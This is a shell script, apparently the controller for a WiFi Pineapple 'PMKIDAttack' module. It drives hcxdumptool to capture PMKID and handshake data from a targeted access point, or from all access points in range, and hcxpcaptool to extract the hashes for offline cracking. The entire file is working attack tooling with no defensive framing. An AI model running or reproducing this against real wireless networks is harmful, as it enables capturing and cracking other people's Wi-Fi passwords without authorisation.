#!/bin/sh

export PATH=$PATH:/sd/bin:/sd/sbin:/sd/usr/sbin:/sd/usr/bin
export LD_LIBRARY_PATH=$LD_LIBRARY_PATH:/sd/lib:/sd/usr/lib

if [[ "$1" == "" ]]; then
    echo "Arguments missing! Run with \"PMKIDAttack.sh [start|start-bg|start-all|stop|check|check-bg|check-all|check-all-bg]\""
    exit 1
fi

if [[ "$1" = "start" ]]; then
    BSSID=$(echo "$2"  | sed 's/\://g')
    uci set pmkidattack.@config[0].bssid=$BSSID
    uci set pmkidattack.@config[0].attack=1
    uci commit pmkidattack

    echo $BSSID > /pineapple/modules/PMKIDAttack/filter.txt   
    hcxdumptool -o /tmp/$BSSID.pcapng -i wlan1mon --filterlist_ap=/pineapple/modules/PMKIDAttack/filter.txt --filtermode=2 --enable_status=1
fi

if [[ "$1" = "start-bg" ]]; then
    BSSID=$(echo "$2"  | sed 's/\://g')
    uci set pmkidattack.@config[0].bssid=$BSSID
    uci set pmkidattack.@config[0].attack=1
    uci commit pmkidattack

    echo $BSSID > /pineapple/modules/PMKIDAttack/filter.txt
    hcxdumptool -o /tmp/$BSSID.pcapng -i wlan1mon --filterlist_ap=/pineapple/modules/PMKIDAttack/filter.txt --filtermode=2 --enable_status=1 &> /dev/null &

    echo 'success'
fi

if [[ "$1" = "start-all" ]]; then
    uci set pmkidattack.@config[0].attack=1
    uci commit pmkidattack

    hcxdumptool -o /tmp/attack-all.pcapng -i wlan1mon --enable_status=1
fi

if [[ "$1" = "stop" ]]; then
    pkill hcxdumptool

    rm -rf /pineapple/modules/PMKIDAttack/log/output.txt

    uci set pmkidattack.@config[0].bssid=""
    uci set pmkidattack.@config[0].attack=0
    uci commit pmkidattack

    echo 'success'
fi

if [[ "$1" = "check" ]]; then
    BSSID=$(echo "$2"  | sed 's/\://g')
    hcxpcaptool -z /tmp/pmkid.txt /tmp/$BSSID.pcapng
fi

if [[ "$1" = "check-bg" ]]; then
    BSSID=$(echo "$2"  | sed 's/\://g')
    hcxpcaptool -z /tmp/pmkid.txt /tmp/$BSSID.pcapng  &> /pineapple/modules/PMKIDAttack/log/output.txt
    rm -r /tmp/pmkid.txt

    echo 'success'
fi

if [[ "$1" = "check-all" ]]; then
    hcxpcaptool -z /tmp/pmkid.txt /tmp/attack-all.pcapng
fi

if [[ "$1" = "check-all-bg" ]]; then
    hcxpcaptool -z /tmp/pmkid.txt /tmp/attack-all.pcapng  &> /pineapple/modules/PMKIDAttack/log/output.txt
    rm -r /tmp/pmkid.txt

    echo 'success'
fi
